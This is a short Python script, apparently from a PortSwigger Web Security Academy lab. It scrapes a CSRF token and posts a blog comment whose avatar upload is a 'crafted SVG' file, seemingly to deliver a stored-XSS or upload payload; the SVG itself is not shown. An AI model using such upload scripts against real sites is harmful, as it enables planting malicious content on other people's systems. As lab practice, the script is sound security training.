import requests
from bs4 import BeautifulSoup


# Initialize the session
s = requests.Session()

# Set the site URL (replace with actual URL)
site = "0ac3003d0375421e9a92c7dc003d00e7.web-security-academy.net"

# Visit the blog post page
post_url = f'https://{site}/post?postId=2'  # Replace 5 with the actual postId if necessary
resp = s.get(post_url)

# Parse the page to extract the CSRF token
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

# Define the comment submission URL
comment_url = f'https://{site}/post/comment'

# Prepare the multipart form data
multipart_form_data = {
    'csrf': (None, csrf),
    'postId': (None, '2'),  # Replace with the actual postId if needed
    'comment': (None, 'Nice blog. Be a shame if anything happened to it.'),
    'name': (None, 'Long'),
    'email': (None, 'lamlon@pdx.edu'),
    'website': (None, 'https://pdx.edu'),
    'avatar': ('avatar.svg', open('lamlon.svg', 'rb'))  # Open the crafted SVG file
}

# Submit the form with the SVG avatar
resp = s.post(comment_url, files=multipart_form_data)

# Check the response status
if resp.status_code == 200:
    print("Comment posted successfully.")
    print("View the blog post to see the avatar.")
else:
    print(f"Failed to post comment: {resp.status_code}")

# Optionally, print the response text for debugging
print(resp.text)
